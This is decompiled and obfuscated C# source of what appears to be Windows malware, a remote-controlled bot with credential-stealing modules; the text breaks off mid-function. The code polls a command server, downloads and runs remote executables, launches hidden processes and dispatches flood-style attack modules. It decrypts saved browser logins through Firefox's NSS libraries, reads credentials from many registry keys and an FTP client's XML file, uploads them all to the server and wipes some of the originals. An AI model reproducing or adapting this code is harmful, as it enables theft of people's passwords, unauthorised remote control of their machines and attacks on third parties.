using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using Microsoft.Win32;

namespace ___codefort;

internal sealed class Class9
{
	public sealed class Class10
	{
		public enum Enum0
		{

		}

		private IntPtr intptr_0;

		public Class10()
		{
			intptr_0 = IntPtr.Zero;
		}

		public Class10(string string_0)
		{
			method_0(string_0);
		}

		[DllImport("kernel32")]
		private static extern IntPtr HeapAlloc(IntPtr intptr_1, uint uint_0, uint uint_1);

		[DllImport("kernel32")]
		private static extern IntPtr GetProcessHeap();

		[DllImport("kernel32")]
		private static extern int lstrlen(IntPtr intptr_1);

		[DllImport("sqlite3")]
		private static extern int sqlite3_open(IntPtr intptr_1, out IntPtr intptr_2);

		[DllImport("sqlite3")]
		private static extern int sqlite3_close(IntPtr intptr_1);

		[DllImport("sqlite3")]
		private static extern int sqlite3_exec(IntPtr intptr_1, IntPtr intptr_2, IntPtr intptr_3, IntPtr intptr_4, out IntPtr intptr_5);

		[DllImport("sqlite3")]
		private static extern IntPtr sqlite3_errmsg(IntPtr intptr_1);

		[DllImport("sqlite3")]
		private static extern int sqlite3_prepare_v2(IntPtr intptr_1, IntPtr intptr_2, int int_0, out IntPtr intptr_3, out IntPtr intptr_4);

		[DllImport("sqlite3")]
		private static extern int sqlite3_step(IntPtr intptr_1);

		[DllImport("sqlite3")]
		private static extern int sqlite3_column_count(IntPtr intptr_1);

		[DllImport("sqlite3")]
		private static extern IntPtr sqlite3_column_name(IntPtr intptr_1, int int_0);

		[DllImport("sqlite3")]
		private static extern int sqlite3_column_type(IntPtr intptr_1, int int_0);

		[DllImport("sqlite3")]
		private static extern int sqlite3_column_int(IntPtr intptr_1, int int_0);

		[DllImport("sqlite3")]
		private static extern double sqlite3_column_double(IntPtr intptr_1, int int_0);

		[DllImport("sqlite3")]
		private static extern IntPtr sqlite3_column_text(IntPtr intptr_1, int int_0);

		[DllImport("sqlite3")]
		private static extern IntPtr sqlite3_column_blob(IntPtr intptr_1, int int_0);

		[DllImport("sqlite3")]
		private static extern IntPtr sqlite3_column_table_name(IntPtr intptr_1, int int_0);

		[DllImport("sqlite3")]
		private static extern int sqlite3_finalize(IntPtr intptr_1);

		public void method_0(string string_0)
		{
			if (sqlite3_open(method_7(string_0), out intptr_0) != 0)
			{
				intptr_0 = IntPtr.Zero;
				throw new Exception(Class22.smethod_0(737971946) + string_0 + Class22.smethod_0(737971863));
			}
		}

		public void method_1()
		{
			if (intptr_0 != IntPtr.Zero)
			{
				sqlite3_close(intptr_0);
			}
		}

		public ArrayList method_2()
		{
			string string_ = Class22.smethod_0(737971871);
			DataTable dataTable = method_4(string_);
			ArrayList arrayList = new ArrayList();
			foreach (DataRow row in dataTable.Rows)
			{
				arrayList.Add(row.ItemArray[0]!.ToString());
			}
			return arrayList;
		}

		public void method_3(string string_0)
		{
			sqlite3_exec(intptr_0, method_7(string_0), IntPtr.Zero, IntPtr.Zero, out var intptr_);
			if (intptr_ != IntPtr.Zero)
			{
				throw new Exception(Class22.smethod_0(737972183) + string_0 + Class22.smethod_0(737972223) + method_8(sqlite3_errmsg(intptr_)));
			}
		}

		public DataTable method_4(string string_0)
		{
			sqlite3_prepare_v2(intptr_0, method_7(string_0), method_9(method_7(string_0)), out var intptr_, out var _);
			DataTable dataTable_ = new DataTable();
			for (int num = method_5(intptr_, ref dataTable_); num == 100; num = method_6(intptr_, ref dataTable_))
			{
			}
			sqlite3_finalize(intptr_);
			return dataTable_;
		}

		private int method_5(IntPtr intptr_1, ref DataTable dataTable_0)
		{
			dataTable_0 = new DataTable(Class22.smethod_0(737972097));
			int num = sqlite3_step(intptr_1);
			if (num == 100)
			{
				int num2 = sqlite3_column_count(intptr_1);
				string empty = string.Empty;
				int num3 = 0;
				object[] array = new object[num2];
				for (int i = 0; i < num2; i++)
				{
					empty = method_8(sqlite3_column_name(intptr_1, i));
					switch (sqlite3_column_type(intptr_1, i))
					{
					default:
						dataTable_0.Columns.Add(empty, Type.GetType(Class22.smethod_0(737972152)));
						array[i] = string.Empty;
						break;
					case 1:
						dataTable_0.Columns.Add(empty, Type.GetType(Class22.smethod_0(737972115)));
						array[i] = sqlite3_column_int(intptr_1, i);
						break;
					case 2:
						dataTable_0.Columns.Add(empty, Type.GetType(Class22.smethod_0(737972140)));
						array[i] = sqlite3_column_double(intptr_1, i);
						break;
					case 3:
						dataTable_0.Columns.Add(empty, Type.GetType(Class22.smethod_0(737972152)));
						array[i] = method_8(sqlite3_column_text(intptr_1, i));
						break;
					case 4:
						dataTable_0.Columns.Add(empty, Type.GetType(Class22.smethod_0(737972152)));
						array[i] = method_8(sqlite3_column_blob(intptr_1, i));
						break;
					}
				}
				dataTable_0.Rows.Add(array);
			}
			return sqlite3_step(intptr_1);
		}

		private int method_6(IntPtr intptr_1, ref DataTable dataTable_0)
		{
			int num = sqlite3_column_count(intptr_1);
			int num2 = 0;
			object[] array = new object[num];
			for (int i = 0; i < num; i++)
			{
				switch (sqlite3_column_type(intptr_1, i))
				{
				default:
					array[i] = string.Empty;
					break;
				case 1:
					array[i] = sqlite3_column_int(intptr_1, i);
					break;
				case 2:
					array[i] = sqlite3_column_double(intptr_1, i);
					break;
				case 3:
					array[i] = method_8(sqlite3_column_text(intptr_1, i));
					break;
				case 4:
					array[i] = method_8(sqlite3_column_blob(intptr_1, i));
					break;
				}
			}
			dataTable_0.Rows.Add(array);
			return sqlite3_step(intptr_1);
		}

		private IntPtr method_7(string string_0)
		{
			if (string_0 == null)
			{
				return IntPtr.Zero;
			}
			Encoding uTF = Encoding.UTF8;
			byte[] bytes = uTF.GetBytes(string_0);
			int uint_ = bytes.Length + 1;
			IntPtr intPtr = HeapAlloc(GetProcessHeap(), 0u, (uint)uint_);
			Marshal.Copy(bytes, 0, intPtr, bytes.Length);
			Marshal.WriteByte(intPtr, bytes.Length, 0);
			return intPtr;
		}

		private string method_8(IntPtr intptr_1)
		{
			if (intptr_1 == IntPtr.Zero)
			{
				return null;
			}
			Encoding uTF = Encoding.UTF8;
			int num = method_9(intptr_1);
			byte[] array = new byte[num];
			Marshal.Copy(intptr_1, array, 0, num);
			return uTF.GetString(array, 0, num);
		}

		private int method_9(IntPtr intptr_1)
		{
			if (intptr_1 == IntPtr.Zero)
			{
				return 0;
			}
			return lstrlen(intptr_1);
		}
	}

	private static class Class11
	{
		public struct Struct0
		{
			public int int_0;

			public int int_1;

			public int int_2;
		}

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate long Delegate0(string string_0);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate long Delegate1();

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate int Delegate2(IntPtr intptr_0, IntPtr intptr_1, StringBuilder stringBuilder_0, int int_0);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate long Delegate3(long long_0, bool bool_0, long long_1);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate int Delegate4(ref Struct0 struct0_0, ref Struct0 struct0_1, int int_0);

		private static IntPtr intptr_0;

		public static string string_0;

		public static string string_1;

		public static string string_2;

		public static string string_3;

		[DllImport("kernel32.dll")]
		private static extern IntPtr LoadLibrary(string string_4);

		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr GetProcAddress(IntPtr intptr_1, string string_4);

		public static long smethod_0(string string_4)
		{
			LoadLibrary(Class9.string_0 + Class22.smethod_0(737972052));
			LoadLibrary(Class9.string_0 + Class22.smethod_0(737972065));
			LoadLibrary(Class9.string_0 + Class22.smethod_0(737972081));
			LoadLibrary(Class9.string_0 + Class22.smethod_0(737971974));
			LoadLibrary(Class9.string_0 + Class22.smethod_0(737971990));
			LoadLibrary(Class9.string_0 + Class22.smethod_0(737972000));
			LoadLibrary(Class9.string_0 + Class22.smethod_0(737972018));
			LoadLibrary(Class9.string_0 + Class22.smethod_0(737971407));
			intptr_0 = LoadLibrary(Class9.string_0 + Class22.smethod_0(737971416));
			IntPtr procAddress = GetProcAddress(intptr_0, Class22.smethod_0(737971433));
			Delegate0 @delegate = (Delegate0)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Delegate0));
			return @delegate(string_4);
		}

		public static long smethod_1()
		{
			IntPtr procAddress = GetProcAddress(intptr_0, Class22.smethod_0(737971454));
			Delegate1 @delegate = (Delegate1)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Delegate1));
			return @delegate();
		}

		public static long smethod_2(long long_0, bool bool_0, long long_1)
		{
			IntPtr procAddress = GetProcAddress(intptr_0, Class22.smethod_0(737971356));
			Delegate3 @delegate = (Delegate3)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Delegate3));
			return @delegate(long_0, bool_0, long_1);
		}

		public static int smethod_3(IntPtr intptr_1, IntPtr intptr_2, StringBuilder stringBuilder_0, int int_0)
		{
			IntPtr procAddress = GetProcAddress(intptr_0, Class22.smethod_0(737971380));
			Delegate2 @delegate = (Delegate2)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Delegate2));
			return @delegate(intptr_1, intptr_2, stringBuilder_0, int_0);
		}

		public static int smethod_4(ref Struct0 struct0_0, ref Struct0 struct0_1, int int_0)
		{
			IntPtr procAddress = GetProcAddress(intptr_0, Class22.smethod_0(737971275));
			Delegate4 @delegate = (Delegate4)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Delegate4));
			return @delegate(ref struct0_0, ref struct0_1, int_0);
		}

		public static void smethod_5(string string_4)
		{
			long num = 0L;
			string path = Environment.GetEnvironmentVariable(Class22.smethod_0(737971297)) + Class22.smethod_0(737971319);
			string[] directories = Directory.GetDirectories(path);
			string[] array = directories;
			foreach (string text in array)
			{
				string[] files = Directory.GetFiles(text);
				string[] array2 = files;
				foreach (string input in array2)
				{
					if (Regex.IsMatch(input, Class22.smethod_0(737971223)))
					{
						smethod_0(text);
						string_0 = input;
					}
				}
			}
			string text2 = string_0;
			Struct0 struct0_ = default(Struct0);
			Struct0 struct0_2 = default(Struct0);
			Class10 @class = new Class10(text2);
			DataTable dataTable = @class.method_4(Class22.smethod_0(737971234));
			@class.method_4(Class22.smethod_0(737971650));
			num = smethod_1();
			smethod_2(num, bool_0: true, 0L);
			foreach (DataRow row in dataTable.Rows)
			{
				string string_5 = Convert.ToString(row[Class22.smethod_0(737971691)].ToString());
				string_1 = Class9.smethod_2(string_5);
				StringBuilder stringBuilder = new StringBuilder(row[Class22.smethod_0(737971591)].ToString());
				int value = smethod_3(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length);
				Struct0 struct0_3 = (Struct0)Marshal.PtrToStructure(new IntPtr(value), typeof(Struct0));
				if (smethod_4(ref struct0_3, ref struct0_, 0) == 0 && struct0_.int_2 != 0)
				{
					byte[] array3 = new byte[struct0_.int_2];
					Marshal.Copy(new IntPtr(struct0_.int_1), array3, 0, struct0_.int_2);
					string_2 = Class9.smethod_2(Encoding.ASCII.GetString(array3));
				}
				StringBuilder stringBuilder2 = new StringBuilder(row[Class22.smethod_0(737971615)].ToString());
				int value2 = smethod_3(IntPtr.Zero, IntPtr.Zero, stringBuilder2, stringBuilder2.Length);
				Struct0 struct0_4 = (Struct0)Marshal.PtrToStructure(new IntPtr(value2), typeof(Struct0));
				if (smethod_4(ref struct0_4, ref struct0_2, 0) == 0 && struct0_2.int_2 != 0)
				{
					byte[] array3 = new byte[struct0_2.int_2];
					Marshal.Copy(new IntPtr(struct0_2.int_1), array3, 0, struct0_2.int_2);
					string_3 = Encoding.ASCII.GetString(array3);
				}
				Class9.smethod_0(Class8.class16_0.string_6 + Class22.smethod_0(737971639), Class22.smethod_0(737971647) + Class8.class16_0.string_9 + Class22.smethod_0(737971530) + string_2 + Class22.smethod_0(737971566) + string_3 + Class22.smethod_0(737971580) + string_1);
			}
		}
	}

	internal struct Struct1
	{
		public int int_0;

		public int int_1;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string string_0;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string string_1;

		public long long_0;

		public int int_2;

		public int int_3;

		public int int_4;

		public int int_5;

		public IntPtr intptr_0;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string string_2;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string string_3;
	}

	internal struct Struct2
	{
		public int int_0;

		public int int_1;
	}

	private Thread thread_0 = new Thread(Class19.smethod_0);

	public static string string_0;

	private string string_1 = string.Empty;

	public static string string_2 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Class22.smethod_0(737972588);

	public static string string_3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class22.smethod_0(737972483);

	private static Struct1 struct1_0;

	public void method_0()
	{
		method_1();
		Thread thread = new Thread(method_2);
		thread.Start();
	}

	private void method_1()
	{
		string string_ = Class22.smethod_0(737971456) + Class8.class16_0.string_8 + Class22.smethod_0(737971485) + Class8.class16_0.string_2 + Class22.smethod_0(737971490) + Class8.class16_0.string_9 + Class22.smethod_0(737971507) + Class8.class16_0.string_10;
		while (true)
		{
			try
			{
				string text = method_3(Class8.class16_0.string_5, string_);
				if (text.Length > 0)
				{
					if (text == Class8.class16_0.string_1)
					{
						break;
					}
					Environment.Exit(-1);
				}
			}
			catch
			{
			}
			Thread.Sleep(Class8.class16_0.int_0 * 60 * 1000);
		}
	}

	private void method_2()
	{
		string string_ = Class22.smethod_0(737970880) + Class8.class16_0.string_8;
		while (true)
		{
			try
			{
				string text = method_3(Class8.class16_0.string_5, string_);
				if (text.Length > 0)
				{
					if (text != string_1)
					{
						method_4(text);
						string_1 = text;
					}
				}
				else
				{
					try
					{
						Class0.smethod_1();
					}
					catch
					{
					}
					try
					{
						Class13.smethod_1();
					}
					catch
					{
					}
					try
					{
						Class17.smethod_1();
					}
					catch
					{
					}
					try
					{
						Class2.smethod_1();
					}
					catch
					{
					}
					string_1 = string.Empty;
				}
			}
			catch
			{
			}
			Thread.Sleep(Class8.class16_0.int_0 * 60 * 1000);
		}
	}

	public static string smethod_0(string string_4, string string_5)
	{
		try
		{
			ServicePointManager.Expect100Continue = false;
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_4);
			httpWebRequest.ContentType = Class22.smethod_0(737970909);
			httpWebRequest.Method = Class22.smethod_0(737970821);
			httpWebRequest.UserAgent = Class8.class16_0.string_1;
			byte[] bytes = Encoding.ASCII.GetBytes(string_5);
			httpWebRequest.ContentLength = bytes.Length;
			Stream requestStream = httpWebRequest.GetRequestStream();
			requestStream.Write(bytes, 0, bytes.Length);
			requestStream.Close();
			WebResponse response = httpWebRequest.GetResponse();
			if (response == null)
			{
				return null;
			}
			StreamReader streamReader = new StreamReader(response.GetResponseStream());
			return streamReader.ReadToEnd().Trim();
		}
		catch
		{
			Environment.Exit(0);
			return null;
		}
	}

	private string method_3(string string_4, string string_5)
	{
		ServicePointManager.Expect100Continue = false;
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_4);
		httpWebRequest.ContentType = Class22.smethod_0(737970909);
		httpWebRequest.Method = Class22.smethod_0(737970821);
		httpWebRequest.UserAgent = Class8.class16_0.string_1;
		byte[] bytes = Encoding.ASCII.GetBytes(string_5);
		httpWebRequest.ContentLength = bytes.Length;
		Stream requestStream = httpWebRequest.GetRequestStream();
		requestStream.Write(bytes, 0, bytes.Length);
		requestStream.Close();
		WebResponse response = httpWebRequest.GetResponse();
		if (response == null)
		{
			return string.Empty;
		}
		StreamReader streamReader = new StreamReader(response.GetResponseStream());
		return streamReader.ReadToEnd().Trim();
	}

	private void method_4(string string_4)
	{
		//IL_03a8: Unknown result type (might be due to invalid IL or missing references)
		string[] array = new string[0];
		try
		{
			array = string_4.Split(new char[1] { '*' });
		}
		catch
		{
		}
		string key;
		if ((key = array[0]) == null)
		{
			return;
		}
		if (Class23.dictionary_0 == null)
		{
			Class23.dictionary_0 = new Dictionary<string, int>(13)
			{
				{
					Class22.smethod_0(737970830),
					0
				},
				{
					Class22.smethod_0(737970847),
					1
				},
				{
					Class22.smethod_0(737970863),
					2
				},
				{
					Class22.smethod_0(737970876),
					3
				},
				{
					Class22.smethod_0(737970764),
					4
				},
				{
					Class22.smethod_0(737970781),
					5
				},
				{
					Class22.smethod_0(737970785),
					6
				},
				{
					Class22.smethod_0(737970804),
					7
				},
				{
					Class22.smethod_0(737970811),
					8
				},
				{
					Class22.smethod_0(737970698),
					9
				},
				{
					Class22.smethod_0(737970714),
					10
				},
				{
					Class22.smethod_0(737970740),
					11
				},
				{
					Class22.smethod_0(737970746),
					12
				}
			};
		}
		if (!Class23.dictionary_0.TryGetValue(key, out var value))
		{
			return;
		}
		switch (value)
		{
		case 0:
			try
			{
				Class0.string_0 = Convert.ToString(array[1]);
				Class0.ushort_0 = ushort.Parse(array[2]);
				Class0.int_1 = Convert.ToInt32(array[3]);
				Class0.int_0 = Convert.ToInt32(array[4]);
				Class0.smethod_0();
				break;
			}
			catch
			{
				break;
			}
		case 1:
			try
			{
				Class13.string_0 = Convert.ToString(array[1]);
				Class13.int_0 = Convert.ToInt32(array[2]);
				Class13.smethod_0();
				break;
			}
			catch
			{
				break;
			}
		case 2:
			try
			{
				Class17.string_0 = Convert.ToString(array[1]);
				Class17.ushort_0 = ushort.Parse(array[2]);
				Class17.int_1 = Convert.ToInt32(array[3]);
				Class17.int_2 = Convert.ToInt32(array[4]);
				Class17.int_0 = Convert.ToInt32(array[5]);
				Class17.smethod_0();
				break;
			}
			catch
			{
				break;
			}
		case 3:
			try
			{
				Class2.string_0 = Convert.ToString(array[1]);
				Class2.ushort_0 = ushort.Parse(array[2]);
				Class2.int_2 = Convert.ToInt32(array[3]);
				Class2.int_0 = Convert.ToInt32(array[4]);
				Class2.int_1 = Convert.ToInt32(array[5]);
				Class2.smethod_0();
				break;
			}
			catch
			{
				break;
			}
		case 4:
			try
			{
				string text = Class8.class21_0.method_3(new Random().Next(5, 12)) + Class22.smethod_0(737969707);
				new WebClient().DownloadFile(Convert.ToString(array[1]), Environment.GetEnvironmentVariable(Class22.smethod_0(737969894)) + Class22.smethod_0(737969724) + text);
				Process process = new Process();
				process.StartInfo.FileName = Environment.GetEnvironmentVariable(Class22.smethod_0(737969894)) + Class22.smethod_0(737969724) + text;
				process.Start();
				break;
			}
			catch
			{
				break;
			}
		case 5:
			try
			{
				Process process = new Process();
				process.StartInfo = new ProcessStartInfo(Convert.ToString(array[1]));
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
				break;
			}
			catch
			{
				break;
			}
		case 6:
			try
			{
				Class8.class4_0.method_3(Convert.ToString(array[1]));
				break;
			}
			catch
			{
				break;
			}
		case 7:
			if (array[1] == Environment.MachineName || array[1].ToUpper() == Class22.smethod_0(737971146))
			{
				Class8.class4_0.method_4();
			}
			break;
		case 8:
			try
			{
				MessageBox.Show(array[1], array[2]);
				break;
			}
			catch
			{
				break;
			}
		case 9:
			try
			{
				smethod_8();
				break;
			}
			catch
			{
				break;
			}
		case 10:
			try
			{
				smethod_1();
				break;
			}
			catch
			{
				break;
			}
		case 11:
			try
			{
				smethod_4(array[1], array[2]);
				break;
			}
			catch
			{
				break;
			}
		case 12:
			try
			{
				Class19.smethod_0();
				break;
			}
			catch
			{
				break;
			}
		}
	}

	public static void smethod_1()
	{
		smethod_0(Class8.class16_0.string_7 + Class22.smethod_0(737971639), Class22.smethod_0(737971647) + Class8.class16_0.string_9 + Class22.smethod_0(737971164) + Class8.class16_0.string_10 + Class22.smethod_0(737971181) + Class8.class16_0.string_11);
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Class22.smethod_0(737971079), writable: true);
		if (registryKey != null)
		{
			smethod_0(Class8.class16_0.string_7 + Class22.smethod_0(737971639), Class22.smethod_0(737971647) + Class8.class16_0.string_9 + Class22.smethod_0(737971114) + (string)registryKey.GetValue(Class22.smethod_0(737971028)) + Class22.smethod_0(737971566) + (string)registryKey.GetValue(Class22.smethod_0(737971041)));
			registryKey.SetValue(Class22.smethod_0(737971028), string.Empty);
			registryKey.SetValue(Class22.smethod_0(737971041), string.Empty);
		}
		registryKey = Registry.LocalMachine.OpenSubKey(Class22.smethod_0(737971071), writable: true);
		if (registryKey != null)
		{
			smethod_0(Class8.class16_0.string_7 + Class22.smethod_0(737971639), Class22.smethod_0(737971647) + Class8.class16_0.string_9 + Class22.smethod_0(737970976) + (string)registryKey.GetValue(Class22.smethod_0(737970393)));
			registryKey.SetValue(Class22.smethod_0(737970393), string.Empty);
		}
		registryKey = Registry.LocalMachine.OpenSubKey(Class22.smethod_0(737970412), writable: true);
		if (registryKey != null)
		{
			smethod_0(Class8.class16_0.string_7 + Class22.smethod_0(737971639), Class22.smethod_0(737971647) + Class8.class16_0.string_9 + Class22.smethod_0(737970327) + (string)registryKey.GetValue(Class22.smethod_0(737970393)));
			registryKey.SetValue(Class22.smethod_0(737970393), string.Empty);
		}
		registryKey = Registry.LocalMachine.OpenSubKey(Class22.smethod_0(737970242), writable: true);
		if (registryKey != null)
		{
			smethod_0(Class8.class16_0.string_7 + Class22.smethod_0(737971639), Class22.smethod_0(737971647) + Class8.class16_0.string_9 + Class22.smethod_0(737970178) + (string)registryKey.GetValue(Class22.smethod_0(737971028)) + Class22.smethod_0(737970228) + (string)registryKey.GetValue(Class22.smethod_0(737971041)));
			registryKey.SetValue(Class22.smethod_0(737971028), string.Empty);
			registryKey.SetValue(Class22.smethod_0(737971041), string.Empty);
		}
		registryKey = Registry.LocalMachine.OpenSubKey(Class22.smethod_0(737970629), writable: true);
		if (registryKey != null)
		{
			smethod_0(Class8.class16_0.string_7 + Class22.smethod_0(737971639), Class22.smethod_0(737971647) + Class8.class16_0.string_9 + Class22.smethod_0(737970563) + (string)registryKey.GetValue(Class22.smethod_0(737970610)));
			registryKey.SetValue(Class22.smethod_0(737970610), string.Empty);
		}
		registryKey = Registry.LocalMachine.OpenSubKey(Class22.smethod_0(737970503), writable: true);
		if (registryKey != null)
		{
			smethod_0(Class8.class16_0.string_7 + Class22.smethod_0(737971639), Class22.smethod_0(737971647) + Class8.class16_0.string_9 + Class22.smethod_0(737970454) + (string)registryKey.GetValue(Class22.smethod_0(737970610)));
			registryKey.SetValue(Class22.smethod_0(737970610), string.Empty);
		}
		registryKey = Registry.LocalMachine.OpenSubKey(Class22.smethod_0(737973962), writable: true);
		if (registryKey != null)
		{
			smethod_0(Class8.class16_0.string_7 + Class22.smethod_0(737971639), Class22.smethod_0(737971647) + Class8.class16_0.string_9 + Class22.smethod_0(737973914) + (string)registryKey.GetValue(Class22.smethod_0(737970610)));
			registryKey.SetValue(Class22.smethod_0(737970610), string.Empty);
		}
		registryKey = Registry.LocalMachine.OpenSubKey(Class22.smethod_0(737973855), writable: true);
		if (registryKey != null)
		{
			smethod_0(Class8.class16_0.string_7 + Class22.smethod_0(737971639), Class22.smethod_0(737971647) + Class8.class16_0.string_9 + Class22.smethod_0(737973815) + (string)registryKey.GetValue(Class22.smethod_0(737970610)));
			registryKey.SetValue(Class22.smethod_0(737970610), string.Empty);
		}
		registryKey = Registry.LocalMachine.OpenSubKey(Class22.smethod_0(737974256), writable: true);
		if (registryKey != null)
		{
			smethod_0(Class8.class16_0.string_7 + Class22.smethod_0(737971639), Class22.smethod_0(737971647) + Class8.class16_0.string_9 + Class22.smethod_0(737974085) + (string)registryKey.GetValue(Class22.smethod_0(737970610)));
			registryKey.SetValue(Class22.smethod_0(737970610), string.Empty);
		}
		registryKey = Registry.LocalMachine.OpenSubKey(Class22.smethod_0(737974131), writable: true);
		if (registryKey != null)
		{
			smethod_0(Class8.class16_0.string_7 + Class22.smethod_0(737971639), Class22.smethod_0(737971647) + Class8.class16_0.string_9 + Class22.smethod_0(737973441) + (string)registryKey.GetValue(Class22.smethod_0(737970610)));
			registryKey.SetValue(Class22.smethod_0(737970610), string.Empty);
		}
		registryKey = Registry.LocalMachine.OpenSubKey(Class22.smethod_0(737973496), writable: true);
		if (registryKey != null)
		{
			smethod_0(Class8.class16_0.string_7 + Class22.smethod_0(737971639), Class22.smethod_0(737971647) + Class8.class16_0.string_9 + Class22.smethod_0(737973331) + (string)registryKey.GetValue(Class22.smethod_0(737970610)));
			registryKey.SetValue(Class22.smethod_0(737970610), string.Empty);
		}
		registryKey = Registry.LocalMachine.OpenSubKey(Class22.smethod_0(737973279), writable: true);
		if (registryKey != null)
		{
			smethod_0(Class8.class16_0.string_7 + Class22.smethod_0(737971639), Class22.smethod_0(737971647) + Class8.class16_0.string_9 + Class22.smethod_0(737973751) + (string)registryKey.GetValue(Class22.smethod_0(737970610)));
			registryKey.SetValue(Class22.smethod_0(737970610), string.Empty);
		}
		registryKey = Registry.LocalMachine.OpenSubKey(Class22.smethod_0(737973680), writable: true);
		if (registryKey != null)
		{
			smethod_0(Class8.class16_0.string_7 + Class22.smethod_0(737971639), Class22.smethod_0(737971647) + Class8.class16_0.string_9 + Class22.smethod_0(737973512) + (string)registryKey.GetValue(Class22.smethod_0(737970610)));
			registryKey.SetValue(Class22.smethod_0(737970610), string.Empty);
		}
		registryKey = Registry.LocalMachine.OpenSubKey(Class22.smethod_0(737972949), writable: true);
		if (registryKey != null)
		{
			smethod_0(Class8.class16_0.string_7 + Class22.smethod_0(737971639), Class22.smethod_0(737971647) + Class8.class16_0.string_9 + Class22.smethod_0(737972898) + (string)registryKey.GetValue(Class22.smethod_0(737970610)));
			registryKey.SetValue(Class22.smethod_0(737970610), string.Empty);
		}
		registryKey = Registry.LocalMachine.OpenSubKey(Class22.smethod_0(737972844), writable: true);
		if (registryKey != null)
		{
			smethod_0(Class8.class16_0.string_7 + Class22.smethod_0(737971639), Class22.smethod_0(737971647) + Class8.class16_0.string_9 + Class22.smethod_0(737972757) + (string)registryKey.GetValue(Class22.smethod_0(737972798)));
			registryKey.SetValue(Class22.smethod_0(737970610), string.Empty);
		}
	}

	public static string smethod_2(string string_4)
	{
		try
		{
			if (string_4 == null)
			{
				string_4 = Class22.smethod_0(737973196);
			}
			byte[] array = new byte[string_4.Length];
			array = Encoding.UTF8.GetBytes(string_4);
			return Convert.ToBase64String(array);
		}
		catch
		{
			return Class22.smethod_0(737973196);
		}
	}

	public static string smethod_3(string string_4)
	{
		try
		{
			UTF8Encoding uTF8Encoding = new UTF8Encoding();
			Decoder decoder = uTF8Encoding.GetDecoder();
			byte[] array = Convert.FromBase64String(string_4);
			int charCount = decoder.GetCharCount(array, 0, array.Length);
			char[] array2 = new char[charCount];
			decoder.GetChars(array, 0, array.Length, array2, 0);
			return new string(array2);
		}
		catch
		{
			return Class22.smethod_0(737973203);
		}
	}

	[DllImport("user32.dll")]
	private static extern int ShowWindow(int int_0, int int_1);

	private static void smethod_4(string string_4, string string_5)
	{
		if (smethod_5())
		{
			smethod_6(string_4, string_3 + string_5 + Class22.smethod_0(737973231));
			smethod_7();
		}
	}

	private static bool smethod_5()
	{
		if (File.Exists(string_2))
		{
			return true;
		}
		return false;
	}

	private static void smethod_6(string string_4, string string_5)
	{
		try
		{
			WebClient webClient = new WebClient();
			webClient.DownloadFile(string_4, string_5);
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = string_2;
			processStartInfo.Arguments = Class22.smethod_0(737973244) + string_3 + Class22.smethod_0(737969405) + string_5;
			Process.Start(processStartInfo);
			Thread.Sleep(1000);
		}
		catch
		{
		}
	}

	private static void smethod_7()
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (process.ProcessName.Contains(Class22.smethod_0(737973134)))
			{
				try
				{
					int int_ = process.MainWindowHandle.ToInt32();
					ShowWindow(int_, 0);
				}
				catch
				{
				}
			}
		}
	}

	private static void smethod_8()
	{
		smethod_13();
		smethod_12();
		smethod_14();
		smethod_10();
		if (Directory.Exists(Environment.GetEnvironmentVariable(Class22.smethod_0(737973151)) + Class22.smethod_0(737973160)))
		{
			string_0 = Environment.GetEnvironmentVariable(Class22.smethod_0(737973151)) + Class22.smethod_0(737973160);
			Class11.smethod_5(Class8.class16_0.string_6);
		}
	}

	public static void smethod_9()
	{
		string text = (string)Registry.GetValue(Class22.smethod_0(737973056), string.Empty, null);
		string text2 = smethod_11((string)Registry.GetValue(Class22.smethod_0(737973104), string.Empty, null));
		smethod_0(Class8.class16_0.string_6 + Class22.smethod_0(737971639), Class22.smethod_0(737971647) + Class8.class16_0.string_9 + Class22.smethod_0(737973024) + text + Class22.smethod_0(737971566) + text2);
	}

	public static void smethod_10()
	{
		string text = null;
		string text2 = null;
		string text3 = null;
		try
		{
			XmlDocument xmlDocument = null;
			XmlNodeList xmlNodeList = null;
			xmlDocument = new XmlDocument();
			xmlDocument.Load(Environment.GetEnvironmentVariable(Class22.smethod_0(737971297)) + Class22.smethod_0(737973051));
			xmlNodeList = xmlDocument.SelectNodes(Class22.smethod_0(737972452));
			foreach (XmlNode item in xmlNodeList)
			{
				try
				{
					text = item.ChildNodes.Item(0)!.InnerText;
					text2 = item.ChildNodes.Item(4)!.InnerText;
					text3 = item.ChildNodes.Item(5)!.InnerText;
					smethod_0(Class8.class16_0.string_6 + Class22.smethod_0(737971639), Class22.smethod_0(737971647) + Class8.class16_0.string_9 + Class22.smethod_0(737972365) + text2 + Class22.smethod_0(737971566) + text3 + Class22.smethod_0(737971580) + text);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	public static string smethod_11(string string_4)
	{
		string text = string.Empty;
		for (int i = 0; i < string_4.Length; i += 2)
		{
			string value = string_4.Substring(i, 2);
